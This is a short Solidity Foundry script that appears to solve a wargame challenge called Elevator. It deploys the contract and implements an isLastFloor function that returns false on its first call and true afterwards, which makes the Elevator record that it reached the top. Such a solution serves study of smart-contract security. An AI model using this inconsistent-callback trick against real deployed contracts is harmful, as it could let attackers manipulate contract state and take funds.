// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Elevator.sol";

contract ElevatorHack is Script {
    Elevator public elevator;
    uint256 private counter;

    function run() public {
        elevator = new Elevator();

        elevator.goTo(0);

        console.log(elevator.top());
        console.log(elevator.floor());
    }

    function isLastFloor(uint256) external returns (bool) {
        counter++;
        if (counter > 1) {
            return true;
        }
        return false;
    }
}
